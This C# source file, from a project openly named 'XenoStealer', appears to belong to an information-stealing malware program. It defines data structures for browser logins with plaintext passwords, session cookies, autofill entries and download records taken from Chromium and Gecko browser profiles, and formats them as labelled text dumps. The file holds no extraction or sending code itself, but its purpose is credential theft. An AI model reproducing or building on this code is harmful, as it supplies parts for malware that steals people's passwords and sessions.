using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace XenoStealer
{
    public static class DataExtractionStructs
    {

        public struct ChromiumAutoFill
        {
            public string name;
            public string value;

            public ChromiumAutoFill(string _name, string _value)
            {
                name = _name;
                value = _value;
            }

            public override string ToString()
            {
                string result = "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                return result;
            }
        }
        public struct ChromiumCookie
        {
            public string domain;
            public string path;
            public string name;
            public string value;
            public ulong expiry;
            public bool isSecure;
            public bool isHttpOnly;
            public bool expired;

            public ChromiumCookie(string _domain, string _path, string _name, string _value, ulong _expiry, bool _isSecure, bool _isHttpOnly)
            {
                //convert the timestamp to unix
                _expiry /= 1000000;
                _expiry -= 11644473600;//1601-01-01T00:00:00Z

                domain = _domain;
                path = _path;
                name = _name;
                value = _value;
                expiry = _expiry;
                isSecure = _isSecure;
                isHttpOnly = _isHttpOnly;
                expired = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds >= _expiry;
            }

            public override string ToString()
            {
                string result = "DOMAIN: " + domain;
                result += Environment.NewLine;
                result += "PATH: " + path;
                result += Environment.NewLine;
                result += "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                result += Environment.NewLine;
                result += "EXPIRY: " + expiry.ToString();
                result += Environment.NewLine;
                result += "IS_SECURE: " + isSecure.ToString();
                result += Environment.NewLine;
                result += "IS_HTTP_ONLY: " + isHttpOnly.ToString();
                result += Environment.NewLine;
                result += "EXPIRED: " + expired.ToString();
                return result;
            }
        }

        public struct ChromiumLogin 
        {
            public string hostname;
            public string username;
            public string password;


            public ChromiumLogin(string _username, string _password, string _hostname)
            {
                hostname = _hostname;
                username = _username;
                password = _password;
            }

            public override string ToString()
            {
                string value = "HOSTNAME: " + hostname;
                value += Environment.NewLine;
                value += "USERNAME: " + username;
                value += Environment.NewLine;
                value += "PASSWORD: " + password;
                return value;
            }
        }



        [Flags]
        public enum GeckoBrowserOptions 
        {
            None = 0,
            Logins = 1 << 0, // 1
            Cookies = 1 << 1, // 2
            Autofills = 1 << 2, // 4
            All = Logins | Cookies | Autofills
        }

        public struct GeckoBrowser 
        {
            public string browserName;

            public GeckoProfile[] profiles;

            public GeckoBrowser(GeckoProfile[] _profiles, string _browserName) 
            {
                browserName = _browserName;
                if (_profiles == null)
                {
                    profiles = new GeckoProfile[0];
                }
                else 
                {
                    profiles = _profiles;
                }
            }

        }

        public struct GeckoProfile 
        {
            public string profileName;

            public GeckoLogin[] logins;
            public GeckoCookie[] cookies;
            public GeckoAutoFill[] autofills;

            public GeckoProfile(GeckoLogin[] _logins, GeckoCookie[] _cookies, GeckoAutoFill[] _autofills, string _profileName) 
            {
                profileName= _profileName;
                if (_logins == null)
                {
                    logins = new GeckoLogin[0];
                }
                else
                {
                    logins = _logins;
                }

                if (_cookies == null)
                {
                    cookies = new GeckoCookie[0];
                }
                else
                {
                    cookies = _cookies;
                }

                if (_autofills == null)
                {
                    autofills = new GeckoAutoFill[0];
                }
                else
                {
                    autofills = _autofills;
                }

            }

            public string GetLoginsString()
            {
                string result = "";
                foreach (GeckoLogin i in logins)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

            public string GetCookiesString()
            {
                string result = "";
                foreach (GeckoCookie i in cookies)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

            public string GetAutofillsString()
            {
                string result = "";
                foreach (GeckoAutoFill i in autofills)
                {
                    result += i.ToString();
                    result += Environment.NewLine;
                    result += Environment.NewLine;
                }
                return result;
            }

        }

        public struct GeckoLogin  
        {
            public string hostname;
            public string username;
            public string password;


            public GeckoLogin(string _username, string _password, string _hostname) 
            {
                hostname = _hostname;
                username = _username;
                password = _password;
            }

            public override string ToString() 
            {
                string value = "HOSTNAME: " + hostname;
                value += Environment.NewLine;
                value += "USERNAME: " + username;
                value += Environment.NewLine;
                value += "PASSWORD: " + password;
                return value;
            }

        }

        public struct GeckoCookie 
        {
            public string domain;
            public string path;
            public string name;
            public string value;
            public int expiry;
            public bool isSecure;
            public bool isHttpOnly;
            public bool expired;

            public GeckoCookie(string _domain, string _path, string _name, string _value, int _expiry, bool _isSecure, bool _isHttpOnly) 
            { 
                domain= _domain;
                path= _path;
                name= _name;
                value= _value;
                expiry= _expiry;
                isSecure= _isSecure;
                isHttpOnly = _isHttpOnly;
                expired = DateTime.UtcNow.Subtract(new DateTime(1970, 1, 1)).TotalSeconds>=_expiry;
            }

            public override string ToString()
            {
                string result = "DOMAIN: "+ domain;
                result+= Environment.NewLine;
                result += "PATH: " + path;
                result += Environment.NewLine;
                result += "NAME: " + name;
                result += Environment.NewLine;
                result += "VALUE: " + value;
                result += Environment.NewLine;
                result += "EXPIRY: " + expiry.ToString();
                result += Environment.NewLine;
                result += "IS_SECURE: " + isSecure.ToString();
                result += Environment.NewLine;
                result += "IS_HTTP_ONLY: " + isHttpOnly.ToString();
                result += Environment.NewLine;
                result += "EXPIRED: " + expired.ToString();
                return result;
            }
        }

        public struct GeckoAutoFill 
        {
            public string name;
            public string value;

            public GeckoAutoFill(string _name, string _value) 
            { 
                name = _name;
                value = _value;
            }

            public override string ToString() 
            {
                string result = "NAME: " + name;
                result+= Environment.NewLine;
                result += "VALUE: " + value;
                return result;
            }
        }

        public struct GeckoDownload 
        {
            public string url;
            public string path;
            public GeckoDownload(string _url, string _path) 
            { 
                path= _path;
                url = _url;
            }

            public override string ToString() 
            {
                string result = "URL: "+url;
                result+= Environment.NewLine;
                result += "DOWNLOAD PATH: " + path;
                return result;
            }
        }


    }
}
